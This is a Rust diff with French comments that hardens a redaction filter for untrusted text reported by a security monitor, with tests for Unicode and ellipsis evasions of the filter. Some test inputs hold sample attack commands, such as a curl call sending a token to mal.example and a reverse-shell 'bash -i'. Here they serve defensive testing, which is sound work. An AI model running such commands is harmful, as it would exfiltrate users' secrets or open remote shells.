@@ -18,11 +18,30 @@ pub(crate) fn ferme(texte: &str, max: usize) -> Option<&str> {
     bon.then_some(texte)
 }
 
-/// Une version (« 0.96.0 », « 0.96.0+1789000000 ») : chiffres, `.` et `+` seulement, 32 au plus. Une lettre suffirait
-/// à écrire un mot.
+/// Une version (« 0.96.0 », « 0.96.0+1789000000 ») : son numéro seul, trois nombres au plus de quatre chiffres
+/// chacun ; la date de compilation n'est pas montrée. Une lettre suffirait à écrire un mot, et des chiffres libres
+/// (« 203.0.113.7 ») à passer une adresse.
 fn version(texte: &str) -> Option<&str> {
-    let bon =
-        !texte.is_empty() && texte.len() <= 32 && texte.bytes().all(|o| o.is_ascii_digit() || matches!(o, b'.' | b'+'));
+    let (numero, date) = texte.split_once('+').unwrap_or((texte, "0"));
+    let morceaux: Vec<&str> = numero.split('.').collect();
+    let bon = morceaux.len() <= 3
+        && (1..=20).contains(&date.len())
+        && date.bytes().all(|o| o.is_ascii_digit())
+        && morceaux
+            .iter()
+            .all(|m| (1..=4).contains(&m.len()) && m.bytes().all(|o| o.is_ascii_digit()));
+    bon.then_some(numero)
+}
+
+/// La date d'un bilan, de la forme fixe « AAAA-MM-JJ HH:MM », sinon rien : des chiffres et des signes libres
+/// passeraient une adresse.
+pub(crate) fn date_de_bilan(texte: &str) -> Option<&str> {
+    let forme = b"0000-00-00 00:00";
+    let bon = texte.len() == forme.len()
+        && texte.bytes().zip(forme.iter()).all(|(o, &f)| match f {
+            b'0' => o.is_ascii_digit(),
+            _ => o == f,
+        });
     bon.then_some(texte)
 }
 
@@ -139,18 +158,27 @@ pub(crate) const SORTES: &[&str] = &[
     "inconnu",
 ];
 
-/// Un texte venu de l'ordinateur, qui peut citer un attaquant : d'abord réduit pour la porte (`avant_la_porte`),
-/// puis passé par l'anonymisation et le nettoyage de la voie ouverte (`amelioration::texte` : 300 octets, secrets
-/// remplacés, ponctuation sans effet), puis sans piège. Rangé à part et marqué `non_fiable` : le nettoyage retire ce
-/// qui agit sur un écran ou un lecteur de Markdown, jamais le sens ; une consigne écrite en clair y reste une phrase.
-/// Jeté en entier (vide, `retire`) quand le nettoyage le refuse.
+/// Un texte venu de l'ordinateur, qui peut citer un attaquant : normalisé comme le fera le nettoyage (pleine chasse,
+/// invisibles), puis réduit pour la porte (`avant_la_porte`), puis passé par l'anonymisation et le nettoyage de la voie
+/// ouverte (`amelioration::texte` : 300 octets, secrets remplacés, ponctuation sans effet), sans piège, puis réduit une
+/// dernière fois. Rien ne passe après cette dernière réduction : ce qu'une étape du nettoyage aurait recréé (un mot
+/// recollé, une parenthèse ramenée à l'ASCII) y est retiré à son tour. Rangé à part et marqué `non_fiable` : le
+/// nettoyage retire ce qui agit sur un écran ou un lecteur de Markdown, jamais le sens ; une consigne écrite en clair y
+/// reste une phrase. Jeté en entier (vide, `retire`) quand le nettoyage le refuse ou qu'une réduction ne se stabilise
+/// pas.
 pub(crate) fn texte_externe(brut: &str) -> Value {
-    let reduit = avant_la_porte(brut);
+    let retire = || json!({ "texte_externe": "", "non_fiable": true, "retire": true });
+    let Some(reduit) = reduire(&crate::amelioration::texte::normalise(borne(brut))) else {
+        return retire();
+    };
     let net = crate::amelioration::texte(&reduit)
         .map(|t| crate::modele::resultat::sans_piege(t.as_str(), false))
         .unwrap_or_default();
+    let Some(net) = reduire(&net).map(|t| t.replace('\n', " ")) else {
+        return retire();
+    };
     if net.trim().is_empty() {
-        return json!({ "texte_externe": "", "non_fiable": true, "retire": true });
+        return retire();
     }
     json!({ "texte_externe": net, "non_fiable": true })
 }
@@ -159,44 +187,82 @@ pub(crate) fn texte_externe(brut: &str) -> Value {
 const BRUT_MAX: usize = 8192;
 /// Le masque d'un secret, celui du nettoyeur commun.
 const MASQUE: &str = "<secret>";
+/// Les passes de réduction au plus : au-delà, le texte est construit pour ne jamais se stabiliser, et il est jeté.
+const PASSES_MAX: usize = 8;
 
-/// Ce que le nettoyeur commun laisse passer et que la porte retire avant lui :
-/// - le dernier mot d'un texte coupé en amont (« … ») : un secret coupé n'a plus la forme que le détecteur reconnaît ;
-/// - le numéro d'un processus (« (PID 4242) ») ;
-/// - les parenthèses et leur contenu, et la lignée d'un programme (« ; lignée : … ») : le veilleur et la chasse y
-///   mettent un extrait de la ligne de commande ;
-/// - les crochets (un lien Markdown « `[texte](adresse)` » ne se forme plus) ;
-/// - un numéro de série (« serie », « série », « serial », « S/N ») et ce qui suit une phrase de passe ou un mot de
-///   passe annoncé par `:` ou `=`, jusqu'à la fin de la phrase (une phrase de passe est faite de mots ordinaires).
-fn avant_la_porte(brut: &str) -> String {
+/// Le début du brut, `BRUT_MAX` octets au plus, coupé sur un caractère.
+fn borne(brut: &str) -> &str {
     let mut fin = brut.len().min(BRUT_MAX);
     while !brut.is_char_boundary(fin) {
         fin = fin.saturating_sub(1);
     }
-    let mut texte = brut[..fin].trim_end().to_string();
-    for coupe in ["…", "..."] {
-        if let Some(tete) = texte.strip_suffix(coupe) {
-            texte = tete.rsplit_once(char::is_whitespace).map_or("", |(t, _)| t).to_string();
-            break;
+    brut.get(..fin).unwrap_or_default()
+}
+
+/// `avant_la_porte` jusqu'à ce qu'elle ne change plus rien : un retrait peut en rapprocher deux morceaux qui forment
+/// à leur tour ce qu'elle retire (« pid pid 42 7 » laisse « pid 7 »). Rien si le texte change encore après
+/// `PASSES_MAX` passes.
+fn reduire(texte: &str) -> Option<String> {
+    let mut t = avant_la_porte(texte);
+    for _ in 0..PASSES_MAX {
+        let s = avant_la_porte(&t);
+        if s == t {
+            return Some(t);
         }
+        t = s;
     }
+    None
+}
+
+/// Ce que le nettoyeur commun laisse passer et que la porte retire avant lui (et une dernière fois après lui) :
+/// - un mot coupé en amont : celui qui contient « … » ou « .. », celui que suivent des points de suspension (« … »,
+///   « ... », « . . . ») ; un secret coupé n'a plus la forme que le détecteur reconnaît ;
+/// - le numéro d'un processus (« PID 4242 », « pid=4242 », « pid4242 », « PID n° 4242 ») ;
+/// - les parenthèses et leur contenu (`sans_parentheses`), et la lignée d'un programme (`sans_lignee`) : le veilleur et
+///   la chasse y mettent un extrait de la ligne de commande ;
+/// - les crochets (un lien Markdown « `[texte](adresse)` » ne se forme plus) ;
+/// - un chemin (un mot avec `/` ou `\` et une lettre : « Documents/impots.pdf », relatif compris), une adresse MAC
+///   écrite à points (« a483.e712.3456 ») ;
+/// - un numéro de série (« serie », « série », « serial », « S/N », « sn= ») et ce qui suit une phrase de passe ou un
+///   mot de passe annoncé par `:` ou `=`, jusqu'à la fin de la phrase (une phrase de passe est faite de mots
+///   ordinaires).
+fn avant_la_porte(texte: &str) -> String {
     let texte = sans_lignee(&sans_parentheses(&texte.replace(['[', ']'], " ")));
     let mots: Vec<&str> = texte.split_whitespace().collect();
     let mut sortie: Vec<String> = Vec::with_capacity(mots.len());
     let mut i = 0;
     while let Some(mot) = mots.get(i) {
-        let bas = mot.to_lowercase();
-        let nu = bas.trim_matches(|x: char| !x.is_alphanumeric() && x != '/');
-        if nu == "pid"
-            && mots
-                .get(i.saturating_add(1))
-                .is_some_and(|n| n.starts_with(|x: char| x.is_ascii_digit()))
-        {
-            i = i.saturating_add(2);
+        let suspension = points_de_suspension(&mots, i);
+        if suspension > 0 {
+            i = i.saturating_add(suspension);
+            continue;
+        }
+        if coupe(mot) || points_de_suspension(&mots, i.saturating_add(1)) > 0 {
+            i = i.saturating_add(1);
+            continue;
+        }
+        let pid = numero_de_processus(&mots, i);
+        if pid > 0 {
+            i = i.saturating_add(pid);
+            continue;
+        }
+        i = i.saturating_add(1);
+        if let Some(etiquette) = serie_collee(mot) {
+            sortie.push(etiquette.to_string());
+            sortie.push(MASQUE.into());
+            continue;
+        }
+        if chemin(mot) {
+            sortie.push("<chemin>".into());
+            continue;
+        }
+        if mac_a_points(mot) {
+            sortie.push("<mac>".into());
             continue;
         }
         sortie.push((*mot).to_string());
-        i = i.saturating_add(1);
+        let bas = mot.to_lowercase();
+        let nu = bas.trim_matches(|x: char| !x.is_alphanumeric() && x != '/');
         if matches!(nu, "serie" | "série" | "serial" | "s/n" | "sn") {
             i = masquer_la_serie(&mots, i, &mut sortie);
         } else if annonce_une_phrase(&mots, i) {
@@ -206,34 +272,202 @@ fn avant_la_porte(brut: &str) -> String {
     sortie.join(" ")
 }
 
-/// Le texte sans ses parenthèses ni leur contenu ; une parenthèse ouverte jamais fermée emporte la suite.
+/// Un mot coupé : il contient des points de suspension (« jeton… », « jeton... »).
+fn coupe(mot: &str) -> bool {
+    mot.contains('…') || mot.contains("..")
+}
+
+/// Le nombre de mots, à partir de `i`, faits seulement de points et qui forment des points de suspension (« … »,
+/// « ... », « . . . ») ; 0 sinon. Un point seul reste une ponctuation.
+fn points_de_suspension(mots: &[&str], i: usize) -> usize {
+    let mut points = 0usize;
+    let mut n = 0usize;
+    while let Some(m) = mots.get(i.saturating_add(n)) {
+        if m.is_empty() || !m.chars().all(|x| x == '.' || x == '…') {
+            break;
+        }
+        points = m
+            .chars()
+            .fold(points, |p, x| p.saturating_add(if x == '…' { 3 } else { 1 }));
+        n = n.saturating_add(1);
+    }
+    if points >= 2 { n } else { 0 }
+}
+
+/// Retire les mots de liaison d'un numéro (« = », « : », « # », « n° », « no ») au début de `texte`.
+fn sans_liaison(texte: &str) -> &str {
+    let separateur = |x: char| "=:#°º".contains(x);
+    let t = texte.trim_start_matches(separateur);
+    let t = ["n°", "nº", "no"].iter().find_map(|p| t.strip_prefix(p)).unwrap_or(t);
+    t.trim_start_matches(separateur)
+}
+
+/// Le nombre de mots, à partir de `i`, qui disent le numéro d'un processus (« PID 4242 », « pid=4242 », « PID:4242 »,
+/// « pid4242 », « PID n° 4242 ») ; 0 sinon.
+fn numero_de_processus(mots: &[&str], i: usize) -> usize {
+    let chiffre = |t: &str| t.starts_with(|x: char| x.is_ascii_digit());
+    let Some(mot) = mots.get(i) else { return 0 };
+    let bas = mot.to_lowercase();
+    let Some(reste) = bas
+        .trim_start_matches(|x: char| !x.is_alphanumeric())
+        .strip_prefix("pid")
+    else {
+        return 0;
+    };
+    let reste = sans_liaison(reste);
+    if chiffre(reste) {
+        return 1;
+    }
+    if !reste.is_empty() {
+        return 0;
+    }
+    // Le numéro dans un des trois mots suivants, après des mots de liaison seulement (« PID : n° 4242 »).
+    for n in 1..=3usize {
+        let Some(m) = mots.get(i.saturating_add(n)) else {
+            return 0;
+        };
+        let m = m.to_lowercase();
+        let r = sans_liaison(&m);
+        if chiffre(r) {
+            return n.saturating_add(1);
+        }
+        if !r.is_empty() {
+            return 0;
+        }
+    }
+    0
+}
+
+/// Un numéro de série collé à son nom (« sn=PF2ABCDE », « S/N:AB12 ») : rend le nom et son séparateur, à garder
+/// devant le masque, si la suite porte un chiffre.
+fn serie_collee(mot: &str) -> Option<&str> {
+    let fin = mot.find(['=', ':'])?;
+    let nom = mot.get(..fin)?.to_lowercase();
+    let nu = nom.trim_start_matches(|x: char| !x.is_alphanumeric());
+    let suite = mot.get(fin..)?.trim_start_matches(['=', ':']);
+    let serie = matches!(
+        nu,
+        "serie" | "série" | "serial" | "s/n" | "sn" | "serialnumber" | "serial_number"
+    );
+    (serie && suite.chars().any(|x| x.is_ascii_digit()))
+        .then(|| mot.get(..=fin))
+        .flatten()
+}
+
+/// Un mot qui désigne un chemin : un `/` ou un `\` entre deux morceaux, dont l'un porte une lettre
+/// (« Documents/impots-2026.pdf », « Bureau/paie.xlsx »). « 1/2 » et « S/N » restent, et une adresse (« :// ») est
+/// laissée au nettoyeur commun, qui la masque en entier (« `<url>` »).
+fn chemin(mot: &str) -> bool {
+    let nu = mot.trim_matches(|x: char| !x.is_alphanumeric());
+    if nu.eq_ignore_ascii_case("s/n") || nu.contains("://") {
+        return false;
+    }
+    let morceaux: Vec<&str> = nu.split(['/', '\\']).collect();
+    morceaux.len() > 1 && morceaux.iter().any(|m| m.chars().any(char::is_alphabetic))
+}
+
+/// Une adresse MAC écrite à points, trois groupes de quatre chiffres hexadécimaux (« a483.e712.3456 »).
+fn mac_a_points(mot: &str) -> bool {
+    let nu = mot.trim_matches(|x: char| !x.is_ascii_hexdigit());
+    let groupes: Vec<&str> = nu.split('.').collect();
+    groupes.len() == 3
+        && groupes
+            .iter()
+            .all(|g| g.len() == 4 && g.chars().all(|x| x.is_ascii_hexdigit()))
+}
+
+/// Le texte sans ses parenthèses ni leur contenu. Chaque paire fermée est retirée avec ce qu'elle contient (les paires
+/// imbriquées avec elle). Une parenthèse seule ne retire que son voisinage : « ( » jusqu'à la région retirée suivante,
+/// un « ; » ou la fin ; « ) » depuis la région retirée d'avant, un « ; » ou le début. Un nom de programme « x( » ne
+/// fait donc plus disparaître la raison de l'alerte qui le suit, et un extrait ouvert sans être fermé ne sort pas.
 fn sans_parentheses(texte: &str) -> String {
-    let mut sortie = String::with_capacity(texte.len());
-    let mut profondeur = 0usize;
-    for x in texte.chars() {
+    let c: Vec<char> = texte.chars().collect();
+    let mut retire = vec![false; c.len()];
+    let mut ouvertes: Vec<usize> = Vec::new();
+    let mut fermantes_seules: Vec<usize> = Vec::new();
+    for (k, x) in c.iter().enumerate() {
         match x {
-            '(' => profondeur = profondeur.saturating_add(1),
-            ')' if profondeur > 0 => profondeur = profondeur.saturating_sub(1),
-            _ if profondeur == 0 => sortie.push(x),
+            '(' => ouvertes.push(k),
+            ')' => match ouvertes.pop() {
+                Some(o) => retire
+                    .iter_mut()
+                    .take(k.saturating_add(1))
+                    .skip(o)
+                    .for_each(|r| *r = true),
+                None => fermantes_seules.push(k),
+            },
             _ => {}
         }
     }
-    sortie
-}
-
-/// Le texte sans « lignée : … » ni « lineage: … », chacun jusqu'au `;` qui le suit (ou jusqu'au bout).
-fn sans_lignee(texte: &str) -> String {
-    const MOTS: [&str; 6] = ["lignée", "Lignée", "LIGNÉE", "lineage", "Lineage", "LINEAGE"];
-    let mut sortie = String::with_capacity(texte.len());
-    let mut reste = texte;
-    while let Some(debut) = MOTS.iter().filter_map(|m| reste.find(m)).min() {
-        sortie.push_str(&reste[..debut]);
-        match reste[debut..].split_once(';') {
-            Some((_, suite)) => reste = suite,
-            None => return sortie,
+    // Une parenthèse seule s'arrête aussi à ce qu'une autre a déjà retiré : chaque caractère n'est vu qu'une fois.
+    for o in ouvertes {
+        for k in o..c.len() {
+            if (k > o && retire.get(k) == Some(&true)) || c.get(k) == Some(&';') {
+                break;
+            }
+            if let Some(r) = retire.get_mut(k) {
+                *r = true;
+            }
         }
     }
-    sortie.push_str(reste);
+    for f in fermantes_seules {
+        for k in (0..=f).rev() {
+            if (k < f && retire.get(k) == Some(&true)) || c.get(k) == Some(&';') {
+                break;
+            }
+            if let Some(r) = retire.get_mut(k) {
+                *r = true;
+            }
+        }
+    }
+    c.iter().zip(&retire).map(|(x, r)| if *r { ' ' } else { *x }).collect()
+}
+
+/// Le texte sans « lignée : … » ni « lineage: … » (sans égard à la casse ni aux accents, décomposés compris), chacun
+/// jusqu'à la dernière borne fixe qui le suit (« vu au lancement », « seen at start » : le veilleur l'écrit après la
+/// lignée, et un nom de programme ne la déplace pas), ou jusqu'au bout.
+fn sans_lignee(texte: &str) -> String {
+    // Le texte replié (minuscules, sans accents), et pour chaque caractère replié l'octet d'origine où il commence.
+    let mut plie = String::with_capacity(texte.len());
+    let mut origine: Vec<usize> = Vec::with_capacity(texte.len());
+    for (k, x) in texte.char_indices() {
+        if ('\u{300}'..='\u{36F}').contains(&x) {
+            continue;
+        }
+        for y in x.to_lowercase() {
+            let y = match y {
+                'é' | 'è' | 'ê' | 'ë' => 'e',
+                y => y,
+            };
+            for _ in 0..y.len_utf8() {
+                origine.push(k);
+            }
+            plie.push(y);
+        }
+    }
+    origine.push(texte.len());
+    let octet = |p: usize| origine.get(p).copied().unwrap_or(texte.len());
+    let mut sortie = String::with_capacity(texte.len());
+    let mut copie = 0usize;
+    let mut depuis = 0usize;
+    while let Some(debut) = ["lignee", "lineage"]
+        .iter()
+        .filter_map(|m| plie.get(depuis..)?.find(m).map(|p| p.saturating_add(depuis)))
+        .min()
+    {
+        sortie.push_str(texte.get(copie..octet(debut)).unwrap_or_default());
+        let borne = ["vu au lancement", "seen at start"]
+            .iter()
+            .filter_map(|m| plie.get(debut..)?.rfind(m).map(|p| p.saturating_add(debut)))
+            .max();
+        let Some(borne) = borne else {
+            return sortie;
+        };
+        sortie.push(' ');
+        copie = octet(borne);
+        depuis = borne;
+    }
+    sortie.push_str(texte.get(copie..).unwrap_or_default());
     sortie
 }
 
@@ -317,7 +551,10 @@ fn masquer_la_phrase(mots: &[&str], mut i: usize, sortie: &mut Vec<String>) -> u
         }
         masque = true;
         if let Some(fin) = mot.chars().last().filter(|x| ".;!?".contains(*x)) {
-            sortie.push(format!("{MASQUE}{fin}"));
+            // La ponctuation sur sa ligne : le nettoyage masque la valeur d'un mot de passe jusqu'à la fin de la ligne,
+            // et la prendrait avec le masque ; la dernière réduction ne verrait plus la fin de la phrase et
+            // masquerait tout le reste du texte.
+            sortie.push(format!("{MASQUE}\n{fin}"));
             return i;
         }
     }
@@ -502,8 +739,23 @@ mod tests {
             nom_de_programme("/home/alice/.cache/minerai-xmr"),
             Some("minerai-xmr".into())
         );
-        assert_eq!(version("0.96.0+1789000000"), Some("0.96.0+1789000000"));
+        assert_eq!(version("0.96.0+1789000000"), Some("0.96.0"));
+        assert_eq!(version("0.96.0"), Some("0.96.0"));
         assert_eq!(version("0.96 /home"), None);
+        // A-FUITE-6 : ni quatre nombres, ni un nombre trop long, ni un morceau vide.
+        for faux in ["203.0.113.7", "0.96.12345", "0..1", "", "+1789000000", "0.96.0+"] {
+            assert_eq!(version(faux), None, "{faux}");
+        }
+        assert_eq!(date_de_bilan("2026-11-17 10:00"), Some("2026-11-17 10:00"));
+        for faux in [
+            "203-0-113-7:4242",
+            "2026-11-17T10:00",
+            "2026-11-17 10:0",
+            "20261117 10:00:0",
+            "2026-11-17 1a:00",
+        ] {
+            assert_eq!(date_de_bilan(faux), None, "{faux}");
+        }
     }
 
     /// Relecture FUITE-3 : un champ qu'un attaquant peut écrire sort pris dans une liste du code, ou rangé à part.
@@ -526,7 +778,8 @@ mod tests {
         assert_eq!(vue("port", "famille-piegee|x")["cle"], Value::Null);
         assert_eq!(vue("port", "connexion")["cle"], Value::Null);
         for (vers, attendu) in [
-            ("0.96.0+1789000000", json!("0.96.0+1789000000")),
+            ("0.96.0+1789000000", json!("0.96.0")),
+            ("203.0.113.7", Value::Null),
             ("famille-piegee", Value::Null),
         ] {
             let e = Evenement::nouveau(
@@ -646,6 +899,147 @@ mod tests {
         assert!(sort("Mot de passe Wi-Fi : lune verte soupe orange. Fin").ends_with("Fin"));
         assert!(sort("« minerai » (PID 4242) : minage.").contains("minage"));
         assert!(sort("le mot de passe a expiré").contains("expiré"));
+    }
+
+    fn sortie(brut: &str) -> String {
+        texte_externe(brut)["texte_externe"]
+            .as_str()
+            .unwrap_or_default()
+            .to_string()
+    }
+
+    fn sans(brut: &str, absents: &[&str]) -> String {
+        let s = sortie(brut);
+        for a in absents {
+            assert!(!s.contains(a), "« {a} » reste dans {s:?} ({brut:?})");
+        }
+        s
+    }
+
+    /// Attaque FUITE-2 : la normalisation passe avant les réductions, et rien après la dernière ne recrée ce
+    /// qu'elle retire (pleine chasse, invisibles collés, caractère que le filtre change en espace).
+    #[test]
+    fn la_pleine_chasse_et_les_invisibles_ne_contournent_pas_la_porte() {
+        sans(
+            "« bash » (PID 4242) lancé \u{FF08}bash -c curl mal.example/x --data jeton-de-bob\u{FF09} fin",
+            &["jeton-de-bob", "curl", "(", ")"],
+        );
+        let lien = sans(
+            "cliquez \u{FF3B}ici\u{FF3D}\u{FF08}mal.example/x\u{FF09} pour corriger",
+            &["[", "]", "(", "mal.example"],
+        );
+        assert!(lien.ends_with("pour corriger"), "{lien}");
+        sans("processus P\u{200B}ID 4242 arrêté", &["4242"]);
+        sans(
+            "processus \u{FF30}\u{FF29}\u{FF24} \u{FF14}\u{FF12}\u{FF14}\u{FF12} arrêté",
+            &["4242"],
+        );
+        sans("processus pid\u{2028}4242 arrêté", &["4242"]);
+        // Le filtre du nettoyeur change « § » en espace : « pid§4242 » deviendrait « pid 4242 » après la réduction.
+        sans("processus pid§4242 arrêté", &["4242"]);
+        sans("processus pid pid 4242 4243 arrêté", &["4242", "4243"]);
+    }
+
+    /// Attaque FUITE-1 : un nom de programme « x( » ne fait plus disparaître la raison de l'alerte ; une parenthèse
+    /// seule ne retire que son voisinage, et l'extrait qu'elle ouvre ne sort pas.
+    #[test]
+    fn une_parenthese_seule_ne_retire_que_son_voisinage() {
+        let s = sans(
+            "« x( » (PID 4242) lance un shell inverse (bash -i) ; lignée : sshd → x( ; vu au lancement par le veilleur. Vérifiez ce programme.",
+            &["4242", "bash -i", "sshd"],
+        );
+        assert!(
+            s.contains("lance un shell inverse") && s.contains("Vérifiez ce programme"),
+            "{s}"
+        );
+        let s = sans("Programme espion « x( » (PID 7) trouvé dans le dossier", &["PID 7"]);
+        assert!(s.ends_with("trouvé dans le dossier"), "{s}");
+        // Un extrait ouvert sans être fermé ne sort pas, ni avant une fermante seule.
+        let s = sans("alerte (bash -c cat jeton-de-bob ; fin", &["jeton-de-bob"]);
+        assert!(s.ends_with("fin"), "{s}");
+        let s = sans("début ; cat jeton-de-bob) suite", &["jeton-de-bob"]);
+        assert!(s.starts_with("début") && s.ends_with("suite"), "{s}");
+        sans("alerte (a (cat jeton-de-bob) b", &["jeton-de-bob"]);
+    }
+
+    /// Attaque FUITE-4 : un mot coupé par des points de suspension ne sort pas, où qu'ils soient.
+    #[test]
+    fn un_mot_coupe_ne_sort_pas_meme_suivi() {
+        for brut in [
+            "secret coupé ghp_AbCdEfGhIjKlMn… (PID 4242)",
+            "secret coupé ghp_AbCdEfGhIjKlMn….",
+            "secret coupé « ghp_AbCdEfGhIjKlMn… »",
+            "secret coupé ghp_AbCdEfGhIjKlMn… [suite]",
+            "secret coupé ghp_AbCdEfGhIjKlMn… et la suite",
+            "secret coupé ghp_AbCdEfGhIjKlMn…\u{200B} et la suite",
+            "secret coupé ghp_AbCdEfGhIjKlMn . . . et la suite",
+            "secret coupé ghp_AbCdEfGhIjKlMn ... et la suite",
+            "secret coupé ghp_AbCdEfGhIjKlMn.. et la suite",
+            "secret coupé ghp_AbCdEfGhIjKlMn\u{FF0E}\u{FF0E}\u{FF0E} et la suite",
+        ] {
+            let s = sans(brut, &["AbCdEf"]);
+            assert!(s.starts_with("secret coupé"), "{s} ({brut})");
+        }
+        // Un point seul reste une ponctuation.
+        assert_eq!(sortie("Le pare-feu est coupé ."), "Le pare-feu est coupé .");
+    }
+
+    /// Attaque FUITE-5 : la lignée sous toutes ses formes, jusqu'à la borne fixe du veilleur ; le PID et le numéro de
+    /// série collés ; un chemin relatif ; une adresse MAC à points.
+    #[test]
+    fn la_lignee_le_pid_la_serie_et_les_chemins_sous_leurs_variantes() {
+        for brut in [
+            "x lancé ; LIGNEE : sshd → bash -c cat-secret-de-bob ; vu au lancement",
+            "x lancé ; ligne\u{301}e : sshd → bash -c cat-secret-de-bob ; vu au lancement",
+            "x lancé ; Lineage: sshd → bash -c cat-secret-de-bob; seen at start by the watcher.",
+            "y raison ; lignée : sshd → bash; curl cat-secret-de-bob → y ; vu au lancement",
+            "y raison ; lignée : sshd → vu au lancement ; cat-secret-de-bob ; vu au lancement par le veilleur.",
+        ] {
+            let s = sans(brut, &["secret-de-bob", "sshd"]);
+            assert!(
+                s.contains("vu au lancement") || s.contains("seen at start"),
+                "{s} ({brut})"
+            );
+        }
+        // Sans borne, la lignée court jusqu'au bout.
+        sans("x lancé ; lignée : sshd → cat-secret-de-bob", &["secret-de-bob"]);
+        for brut in [
+            "pid=4243 fin",
+            "PID:4244 fin",
+            "pid4245 fin",
+            "PID n°4246 fin",
+            "PID n° 4247 fin",
+            "PID : 4248 fin",
+        ] {
+            assert_eq!(sortie(brut), "fin", "{brut}");
+        }
+        sans("disque sn=PF2ABCDE9 et S/N:WD1234XYZ", &["PF2ABCDE9", "WD1234XYZ"]);
+        sans(
+            "Fichier Documents/impots-2026.pdf et Bureau\\paie.xlsx",
+            &["impots", "Documents", "paie"],
+        );
+        sans("carte a483.e712.3456 perdue", &["a483", "e712", "3456"]);
+        // Ce qui n'est pas visé reste.
+        assert_eq!(
+            sortie("rapide pidgin 1/2 version 1.2.3"),
+            "rapide pidgin 1/2 version 1.2.3"
+        );
+    }
+
+    proptest::proptest! {
+        /// Rien ne passe après la dernière réduction : la sortie de la porte est un point fixe de ses réductions,
+        /// quoi qu'on lui donne (sinon une étape du nettoyage aurait recréé ce qu'elles retirent).
+        #[test]
+        fn la_sortie_est_un_point_fixe_des_reductions(
+            brut in "(pid|PID|n°|sn=|s/n:|lignée|vu au lancement|password:|\\.\\.|…|[(（)）\\[［\\]］]|[ §\u{200B}a-c0-9/.;:]){0,60}"
+        ) {
+            let v = texte_externe(&brut);
+            let t = v["texte_externe"].as_str().unwrap_or_default();
+            if !t.is_empty() {
+                let r = reduire(t).map(|r| r.replace('\n', " "));
+                proptest::prop_assert_eq!(r.as_deref(), Some(t), "{:?}", brut);
+            }
+        }
     }
 
     #[test]
